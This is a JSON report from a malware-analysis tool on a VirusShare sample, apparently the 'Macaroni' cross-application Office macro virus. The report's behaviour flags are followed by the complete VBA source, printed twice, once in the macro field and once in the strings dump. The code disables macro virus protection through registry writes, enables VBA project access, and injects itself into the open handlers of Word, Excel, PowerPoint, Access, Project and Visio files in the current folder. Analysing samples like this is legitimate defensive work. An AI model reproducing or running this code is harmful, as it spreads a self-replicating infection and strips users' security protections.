{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "AccessVBOM": "May attempt to disable VBA macro security and Protected View",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "addfromstring": "May attempt to modify the VBA code",
            "codemodule": "May attempt to modify the VBA code",
            "createobject": "May create an OLE object",
            "open": "May open a file",
            "run": "May run an executable file or a system command",
            "shell": "May run an executable file or a system command",
            "vbcomponents": "May attempt to modify the VBA code",
            "vbproject": "May attempt to modify the VBA code",
            "wscript.shell": "May run an executable file or a system command"
        },
        "macro": "'Macaroni - roy g biv 05/02/05\na=array(\"doc\",\"xls\",\"ppt\",\"mdb\",\"mpp\",\"vsd\")\nb=array(\"Word\",\"Excel\",\"PowerPoint\",\"Access\",\"Project\",\"Visio\")\nc=array(\"Document\",\"WorkBook\",\"p\",\"d\",b(4),\"Document\")\ny=\"byval z as \"\ndim d(6)\nd(4)=y+b(4)\nd(5)=y+\"iv\"+c(0)\ne = 0\nf=\"This\"+c(e)\ng=\"m\"\non error resume next\nvbe.activevbproject.vbcomponents(f).export(g)\nset h=activedocument\nset h=activeworkbook\nset h=activeproject\nset h=activepresentation\nh.vbproject.vbcomponents(f).export(g)\nset i=createobject(\"scripting.filesystemobject\")\nj=i.opentextfile(g).readall\nj=mid(j,instr(j,\"'M\"))\nj=left(j,instr(j,\"'\"+\"'\")+1)\ni.getfile(g).delete\nrandomize\ne=int(rnd*6)\nf=\"This\"+c(e)\ng=instr(j,\"e = \")\nk=vbcrlf\ng=k+left(j,g+3)+cstr(e)+mid(j,g+5)+k+\"end \"\nset j=createobject(\"wscript.shell\")\nl=\"HKCU\\software\\microsoft\\\"\nm=l+\"office\\8.0\\\"\nn=\"REG_SZ\"\nj.regwrite m+\"Word\\Options\\EnableMacroVirusProtection\",0,n\nj.regwrite m+\"MS Project\\Options\\General\\Macro Virus Protection\",\"No\",n\nn=\"REG_DWORD\"\nj.regwrite m+\"Excel\\Microsoft Excel\\Options6\",0,n\nj.regwrite m+\"PowerPoint\\Options\\MacroVirusProtection\",0,n\nm=b(e)\nif e=4then m=\"MS \"+m\nfor o=9to 12\np=l\nif e<>5then p=p+\"Office\\\"+cstr(o)+\".0\\\"\np=p+m+\"\\Security\\\"\nj.regwrite p+\"Level\",1,n\nj.regwrite p+\"AccessVBOM\",1,n\nnext\nset j=i.getfolder(\".\")\nfor each l in j.files\nif lcase(i.getextensionname(l))=a(e)then\nl=l.path\nerr=0\nset n=i.opentextfile(l,8)\nif err.number=0then\nif e=5then\nset n=createobject(m+\".invisibleapp\")\nelse\nif e=4then m=\"MS\"+b(e)\nset n=createobject(m+\".application\")\nend if\nif err.number=0then\nn.visible=0\nn.application.automationsecurity=1\nset o=n.documents\nset o=n.workbooks\nset o=n.presentations\nerr=0\nif e=3then\nn.opencurrentdatabase(l)\nelse\nif e=4then\nn.fileopen(l)\nset o=n.activeproject\nelse\nif e=2then n.visible=1\nset o=o.open(l)\nend if\nend if\nif err.number=0then\nset l=n.vbe.activevbproject.vbcomponents(f).codemodule\nset l=o.vbproject.vbcomponents(f).codemodule\np=\"_open\"\nif e=5then p=\"_\"+c(0)+\"opened\"\np=c(e)+p\nerr=0\nl=l.proccountlines(p,0)\nif err.number>0then\nif e=2then o.vbproject.vbcomponents.add(1).name=f\nif e=3then\nwith n.vbe.activevbproject\n.vbcomponents.add(1).name=f\nset l=.vbcomponents(f).codemodule\nend with\nend if\nset l=o.vbproject.vbcomponents(f).codemodule\no=\"private \"\nq=\"sub \"\nif e=2or e=3then\no=\"\"\nif e=3then q=\"function \"\nend if\nl.addfromstring(o+q+p+\"(\"+d(e)+\")\"+g+q)\nwith n.activepresentation\nwith .slidemaster\nset l=.shapes.addshape(1,0,0,.width,.height)\nend with\nl.fill.transparency=1\nwith l.actionsettings(1)\n.action=8\n.run=p\nend with\n.save\n.close\nend with\nif e=3then\nn.docmd.openform n.currentproject.allforms(0).name,1\nn.forms(0).onopen=\"=\"+p+\"()\"\nn.docmd.save 5,f\nend if\nn.activedocument.save\nn.activeworkbook.save\nn.filesave\nn.fileclose\nend if\nend if\nif e<>2and e<>4then n.quit\nend if\nend if\nend if\nnext\nh.slideshowwindow.view.next''"
    },
    "filename": "VirusShare_1e4b9030f46ed6a89abbe6c19eab0db2",
    "filesize": 2931,
    "filetype": "ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "1e4b9030f46ed6a89abbe6c19eab0db2",
        "sha1": "af21a2d678bcb05495a8f805e4b4b6b14263660b",
        "sha256": "5bd33366ec9c892b51bd94370d74377db01298d65ff2c91688991488bf98d8ed"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "'Macaroni - roy g biv 05/02/05",
            "a=array(\"doc\",\"xls\",\"ppt\",\"mdb\",\"mpp\",\"vsd\")",
            "b=array(\"Word\",\"Excel\",\"PowerPoint\",\"Access\",\"Project\",\"Visio\")",
            "c=array(\"Document\",\"WorkBook\",\"p\",\"d\",b(4),\"Document\")",
            "y=\"byval z as \"",
            "dim d(6)",
            "d(4)=y+b(4)",
            "d(5)=y+\"iv\"+c(0)",
            "e = 0",
            "f=\"This\"+c(e)",
            "g=\"m\"",
            "on error resume next",
            "vbe.activevbproject.vbcomponents(f).export(g)",
            "set h=activedocument",
            "set h=activeworkbook",
            "set h=activeproject",
            "set h=activepresentation",
            "h.vbproject.vbcomponents(f).export(g)",
            "set i=createobject(\"scripting.filesystemobject\")",
            "j=i.opentextfile(g).readall",
            "j=mid(j,instr(j,\"'M\"))",
            "j=left(j,instr(j,\"'\"+\"'\")+1)",
            "i.getfile(g).delete",
            "randomize",
            "e=int(rnd*6)",
            "f=\"This\"+c(e)",
            "g=instr(j,\"e = \")",
            "k=vbcrlf",
            "g=k+left(j,g+3)+cstr(e)+mid(j,g+5)+k+\"end \"",
            "set j=createobject(\"wscript.shell\")",
            "l=\"HKCU\\software\\microsoft\\\"",
            "m=l+\"office\\8.0\\\"",
            "n=\"REG_SZ\"",
            "j.regwrite m+\"Word\\Options\\EnableMacroVirusProtection\",0,n",
            "j.regwrite m+\"MS Project\\Options\\General\\Macro Virus Protection\",\"No\",n",
            "n=\"REG_DWORD\"",
            "j.regwrite m+\"Excel\\Microsoft Excel\\Options6\",0,n",
            "j.regwrite m+\"PowerPoint\\Options\\MacroVirusProtection\",0,n",
            "m=b(e)",
            "if e=4then m=\"MS \"+m",
            "for o=9to 12",
            "if e<>5then p=p+\"Office\\\"+cstr(o)+\".0\\\"",
            "p=p+m+\"\\Security\\\"",
            "j.regwrite p+\"Level\",1,n",
            "j.regwrite p+\"AccessVBOM\",1,n",
            "next",
            "set j=i.getfolder(\".\")",
            "for each l in j.files",
            "if lcase(i.getextensionname(l))=a(e)then",
            "l=l.path",
            "err=0",
            "set n=i.opentextfile(l,8)",
            "if err.number=0then",
            "if e=5then",
            "set n=createobject(m+\".invisibleapp\")",
            "else",
            "if e=4then m=\"MS\"+b(e)",
            "set n=createobject(m+\".application\")",
            "end if",
            "if err.number=0then",
            "n.visible=0",
            "n.application.automationsecurity=1",
            "set o=n.documents",
            "set o=n.workbooks",
            "set o=n.presentations",
            "err=0",
            "if e=3then",
            "n.opencurrentdatabase(l)",
            "else",
            "if e=4then",
            "n.fileopen(l)",
            "set o=n.activeproject",
            "else",
            "if e=2then n.visible=1",
            "set o=o.open(l)",
            "end if",
            "end if",
            "if err.number=0then",
            "set l=n.vbe.activevbproject.vbcomponents(f).codemodule",
            "set l=o.vbproject.vbcomponents(f).codemodule",
            "p=\"_open\"",
            "if e=5then p=\"_\"+c(0)+\"opened\"",
            "p=c(e)+p",
            "err=0",
            "l=l.proccountlines(p,0)",
            "if err.number>0then",
            "if e=2then o.vbproject.vbcomponents.add(1).name=f",
            "if e=3then",
            "with n.vbe.activevbproject",
            ".vbcomponents.add(1).name=f",
            "set l=.vbcomponents(f).codemodule",
            "end with",
            "end if",
            "set l=o.vbproject.vbcomponents(f).codemodule",
            "o=\"private \"",
            "q=\"sub \"",
            "if e=2or e=3then",
            "o=\"\"",
            "if e=3then q=\"function \"",
            "end if",
            "l.addfromstring(o+q+p+\"(\"+d(e)+\")\"+g+q)",
            "with n.activepresentation",
            "with .slidemaster",
            "set l=.shapes.addshape(1,0,0,.width,.height)",
            "end with",
            "l.fill.transparency=1",
            "with l.actionsettings(1)",
            ".action=8",
            ".run=p",
            "end with",
            ".save",
            ".close",
            "end with",
            "if e=3then",
            "n.docmd.openform n.currentproject.allforms(0).name,1",
            "n.forms(0).onopen=\"=\"+p+\"()\"",
            "n.docmd.save 5,f",
            "end if",
            "n.activedocument.save",
            "n.activeworkbook.save",
            "n.filesave",
            "n.fileclose",
            "end if",
            "end if",
            "if e<>2and e<>4then n.quit",
            "end if",
            "end if",
            "end if",
            "next",
            "h.slideshowwindow.view.next''"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.313049",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
